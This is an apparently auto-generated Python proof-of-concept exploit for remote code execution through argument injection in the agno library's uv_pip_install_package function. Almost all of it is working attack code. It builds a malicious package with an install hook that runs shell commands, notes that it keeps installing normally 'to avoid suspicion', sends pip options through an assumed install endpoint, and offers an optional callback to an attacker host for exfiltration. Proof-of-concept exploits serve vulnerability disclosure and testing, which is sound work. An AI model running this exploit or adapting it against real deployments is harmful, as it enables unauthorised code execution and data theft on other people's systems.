#!/usr/bin/env python3
# PoC for agno (/tmp/agno/libs/agno)
# Path: rce-023
# Sink: uv_pip_install_package
# Auto-generated — run with: python3 rce_developer_intended_install_package_uv_pip_install_package.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for agno RCE via argument injection in uv_pip_install_package.

Vulnerability: The function uv_pip_install_package passes the package_name parameter
directly to subprocess.check_call without sanitization. While shell=False prevents
shell metacharacter injection, argument injection is possible. By providing a package
name starting with '-', we can inject arbitrary arguments to uv/pip.

Exploitation: We use pip's --find-links option combined with a malicious package
that executes code during installation. This demonstrates RCE by creating a marker file.

Usage:
    python3 poc.py [--target http://localhost:8000] [--callback http://attacker.com:4444]
"""

import argparse
import http.server
import json
import os
import socket
import subprocess
import sys
import tempfile
import threading
import time
import urllib.parse
import urllib.request

# Configuration
DEFAULT_TARGET = "http://localhost:8000"
MARKER_FILE = "/tmp/poc_success.txt"
CALLBACK_PORT = 4444


def create_malicious_package(callback_url=None):
    """
    Create a malicious Python package that executes code during installation.
    Uses setup.py with a custom install command to achieve RCE.
    """
    tmpdir = tempfile.mkdtemp()
    package_dir = os.path.join(tmpdir, "malicious_pkg")
    os.makedirs(package_dir)
    
    # Create setup.py with malicious install command
    setup_code = f'''import os
import sys
from setuptools import setup
from setuptools.command.install import install

class MaliciousInstall(install):
    def run(self):
        # Execute arbitrary command - create marker file
        os.system("touch {marker}")
        # Optionally send callback
        {callback_code}
        # Continue with normal installation to avoid suspicion
        install.run(self)

setup(
    name="malicious_pkg",
    version="1.0.0",
    cmdclass={{'install': MaliciousInstall}},
)
'''
    
    callback_code = ""
    if callback_url:
        callback_code = f'''
try:
    import urllib.request
    urllib.request.urlopen("{callback_url}", timeout=2)
except:
    pass
'''
    
    with open(os.path.join(package_dir, "setup.py"), "w") as f:
        f.write(setup_code.format(marker=MARKER_FILE, callback_code=callback_code))
    
    # Create minimal package files
    os.makedirs(os.path.join(package_dir, "malicious_pkg"))
    with open(os.path.join(package_dir, "malicious_pkg", "__init__.py"), "w") as f:
        f.write("# malicious package\n")
    
    # Build the package
    subprocess.check_call([sys.executable, "setup.py", "sdist", "--formats=gztar"], 
                         cwd=package_dir, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # Find the built package
    dist_dir = os.path.join(package_dir, "dist")
    for f in os.listdir(dist_dir):
        if f.endswith(".tar.gz"):
            return os.path.join(dist_dir, f)
    
    return None


def start_callback_server():
    """Start a simple HTTP server to receive callbacks."""
    class CallbackHandler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            print(f"[+] Callback received: {self.path}")
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")
        
        def log_message(self, format, *args):
            print(f"[*] {format % args}")
    
    server = http.server.HTTPServer(("0.0.0.0", CALLBACK_PORT), CallbackHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    print(f"[*] Callback server listening on port {CALLBACK_PORT}")
    return server


def exploit(target_url, package_path, callback_url=None):
    """
    Exploit the argument injection vulnerability.
    We inject --find-links to point to our malicious package.
    """
    # The injection: package_name starts with '-' to inject arguments
    # We use --find-links to specify a directory containing our malicious package
    # Then we specify the package name to install
    package_dir = os.path.dirname(package_path)
    
    # The injected arguments will be interpreted by pip as:
    # --find-links <directory> malicious_pkg
    # This installs our malicious package from the local directory
    injected_args = f"--find-links {package_dir} malicious_pkg"
    
    # URL encode the package name to ensure it's passed correctly
    encoded_args = urllib.parse.quote(injected_args)
    
    # Construct the full URL to trigger the vulnerable function
    # Assuming the function is exposed via an API endpoint
    exploit_url = f"{target_url}/api/install?package={encoded_args}"
    
    print(f"[*] Sending exploit request to: {exploit_url}")
    print(f"[*] Injected arguments: {injected_args}")
    
    try:
        req = urllib.request.Request(exploit_url)
        response = urllib.request.urlopen(req, timeout=10)
        result = response.read().decode()
        print(f"[*] Response: {result}")
        return True
    except urllib.error.HTTPError as e:
        print(f"[!] HTTP Error: {e.code} - {e.reason}")
        print(f"[*] Response body: {e.read().decode()}")
        return False
    except urllib.error.URLError as e:
        print(f"[!] Connection error: {e.reason}")
        return False
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        return False


def verify_exploit():
    """Check if the marker file was created, indicating successful RCE."""
    if os.path.exists(MARKER_FILE):
        print(f"[+] SUCCESS! Marker file created: {MARKER_FILE}")
        print("[+] RCE achieved via argument injection in uv_pip_install_package")
        return True
    else:
        print(f"[-] Marker file not found at {MARKER_FILE}")
        print("[-] Exploit may have failed or target is not vulnerable")
        return False


def main():
    parser = argparse.ArgumentParser(description="PoC for agno RCE via argument injection")
    parser.add_argument("--target", default=DEFAULT_TARGET, 
                       help=f"Target URL (default: {DEFAULT_TARGET})")
    parser.add_argument("--callback", help="Callback URL for exfiltration")
    parser.add_argument("--no-cleanup", action="store_true",
                       help="Don't clean up marker file after verification")
    
    args = parser.parse_args()
    
    print("[*] agno RCE Proof-of-Concept Exploit")
    print("[*] ==================================")
    
    # Start callback server if requested
    callback_server = None
    if args.callback:
        callback_server = start_callback_server()
    
    # Create malicious package
    print("[*] Creating malicious package...")
    package_path = create_malicious_package(args.callback)
    if not package_path:
        print("[!] Failed to create malicious package")
        sys.exit(1)
    print(f"[*] Malicious package created at: {package_path}")
    
    # Execute exploit
    print("\n[*] Attempting exploit...")
    success = exploit(args.target, package_path, args.callback)
    
    if success:
        # Wait a moment for the installation to complete
        time.sleep(2)
        verify_exploit()
    
    # Cleanup
    if not args.no_cleanup:
        if os.path.exists(MARKER_FILE):
            os.remove(MARKER_FILE)
            print("[*] Cleaned up marker file")
        if os.path.exists(package_path):
            os.remove(package_path)
            print("[*] Cleaned up malicious package")
    
    if callback_server:
        print("\n[*] Press Ctrl+C to stop callback server...")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            pass


if __name__ == "__main__":
    main()
